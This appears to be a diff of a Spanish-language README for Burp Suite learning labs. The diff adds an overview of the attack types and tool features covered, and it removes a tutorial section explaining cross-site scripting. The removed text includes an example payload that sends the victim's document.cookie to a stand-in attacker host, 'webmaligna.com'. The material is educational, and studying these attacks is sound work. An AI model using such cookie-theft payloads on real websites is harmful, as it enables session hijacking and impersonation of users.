@@ -34,89 +34,27 @@
 </picture>
 </p>
 
+# :desktop_computer:	Funcionamiento de BurpSuite Community Edition
 
+> [!TIP]
+> Laboratorios preparados para el aprendizaje de herramientas utilizando el software <b>Burp Suite</b> en su versión Community Edition. Se aprenderán técnicas y manejo de herramientas básicas para la realización de ataques típicos como:
+> - SQLi 
+> - Cross-Site Scripting (XSS) 
+> - Denegación de servicio (DoS) 
+> - Denegación de servicio Distribuída (DDoS) 
+> - otros métodos de explotación de vulnerabilidades en aplicaciones web/servicio
 
+> Gracias a este software podremos:
+- Realizar de forma automatizada pruebas de exploración y escaneo de vulnerabilidades
+- Escáner de vulnerabilidades avanzado para pruebas manuales
+- Lógica de exploración de vanguardia
+- Presentación detallada de vulnerabilidades, con recomendaciones y los payloads utilizados en cada una de las pruebas 
+- Interceptación del tráfico del navegador mediante el Proxy (estilo <b>man-in-the-middle</b>)
+- Ataques automatizados y personalizados (Burp Intruder)
+- Uso de herramientas de prueba manuales avanzadas
+- Utilización de diferentes métodos y técnicas de conexión a las aplicaciones Web
 
-
-
--------------------------------------------------------------------------------------------------------------------------
-
-## Utilizando JavaScript (JS) por parte del atacante...
-Es cierto que si buscamos por Internet, las vulnerabilidades XSS son percibidas como menos peligrosas que, por ejemplo, las vulnerabilidades de inyección SQL... Nada más lejos de la realidad ya que las consecuencias de la capacidad de ejecutar JavaScript por parte de los navegadores web (aunque en un entorno muy controlado), proporcionan un acceso limitado al sistema operativo del usuario y a sus archivos, lo que lo convierte en un peligroso ataque: 
-- El código JS malicioso tiene acceso a todos los objetos a los que tiene acceso el resto de la página web, lo que incluye el acceso a las cookies del usuario, utilizadas para almacenar la sesión. Si se obtiene la cookie de sesión de un usuario, puede hacerse pasar por este, realizando acciones en su nombre y obteniendo acceso a los datos confidenciales o controles del usuario "robado".
-- JS puede leer el <b>DOM</b> del navegador, lo que le permite realizar modificaciones arbitrarias en él, algo sólo posible dentro de la página en la que se está ejecutando ese código JavaScript.
-- JS puede utilizar el objeto <b>XMLHttpRequest</b> para enviar peticiones HTTP con contenido arbitrario a destinos arbitrarios, incluyendo que en la mayor parte de los navegadores modernos, JavaScript puede utilizar las API de HTML5, dando acceso a la geolocalización del usuario, la cámara web, micrófono e incluso a archivos específicos del sistema de archivos del usuario que está ejecutando ese browser. La mayor parte de estas API requieren el consentimiento del usuario, pero el atacante puede utilizar la ingeniería social para eludir esa limitación.
-- <b>Cross-site Scripting</b> suele utilizarse junto con otros tipos de ataques como <b>Cross-Site Request Forgery (CSRF)</b>, <b>XSS almacenado/persistente</b>, <b>XSS reflejado/no persistente</b> y <b>XSS basado en DOM</b>.
-
-> El funcionamiento consta de las siguientes fases:
-  - Para ejecutar código JavaScript malicioso en el navegador de una víctima, se debe encontrar primero una forma de inyectar código malicioso (<b>payload</b> o carga útil) en una página web que visite el objetivo.
-  - La víctima debe visitar la página web con el código malicioso, para lo cual se podría crear una trampa utilziando la ingeniería social y/o el phishing para enviar una URL maliciosas al objetivo y objetivos. Además, el sitio web vulnerable debe incluir directamente entradas de usuario en sus páginas. 
-  - El atacante inserta una cadena maliciosa que será utilizada dentro de la página web y tratada como código fuente por el navegador de la víctima. 
-  
-Veamos un ejemplo con la ayuda de un fragmento de pseudocódigo (lado servidor) que se utiliza para mostrar el comentario más reciente en una página web:
-<b>
-
-```
-print "<html>"
-
-print "<h1>Comentarios recientes</h1>"
-
-print database.latestComment
-
-print "</html>"
-```
-</b>
-
-Este script toma el último comentario de una base de datos y lo incluye en una página HTML, por lo que el propio navegador asume que el comentario consiste sólo en texto y no contiene etiquetas HTML u otro código... ¡¡Es vulnerable a XSS!! De hecho, un atacante podría enviar un comentario que contenga una carga maliciosa:
-<b>
-
-```
-<script>ejecutando_XSS();</script>
-```
-</b>
-
-Así, el propio servidor donde se aloja la web, proporciona el siguiente código HTML a los usuarios que visitan esta página:
-
-<b>
-
-```
-<html>
-
-<h1>Most recent comment</h1>
-
-<script>doSomethingEvil();</script>
-
-</html>
-```
-</b>
-De este modo, cuando la página se carga en el navegador de la víctima, se ejecuta el script malicioso.
-
-Otro ejemplo que suele conllevar el robo de <b>cookies mediante XSS</b>, otro de los ataques XSS más comunes en el que el atacante se hace pasar por la víctima enviando la cookie a su propio servidor de diferentes maneras, como por ejemplo ejecutar un script similar al siguiente del lado del cliente en el navegador de la víctima:
-
-<b>
-
-```
-<script>
-
-window.location="http://webmaligna.com/?cookie=" + document.cookie
-
-</script>
-```
-</b>
-
-
-
-La siguiente figura ilustra paso a paso un ataque XSS sencillo.
-El atacante inyecta una carga útil en la base de datos del sitio web enviando un formulario vulnerable con contenido JavaScript malicioso.
-La víctima solicita la página web al servidor web.
-El servidor web sirve al navegador de la víctima la página con la carga útil del atacante como parte del cuerpo HTML.
-El navegador de la víctima ejecuta el script malicioso contenido en el cuerpo HTML. En este caso, envía la cookie de la víctima al servidor del atacante.
-El atacante sólo tiene que extraer la cookie de la víctima cuando la petición HTTP llega al servidor.
-El atacante puede ahora utilizar la cookie robada de la víctima para suplantar su identidad.
-Para saber más sobre cómo se llevan a cabo los ataques XSS, puede consultar un artículo titulado A comprehensive tutorial on cross-site scripting.
-
-
-----------------------------------------------------
+____________________________________________________________
 
 
 > El funcionamiento se basa en los siguientes elementos:
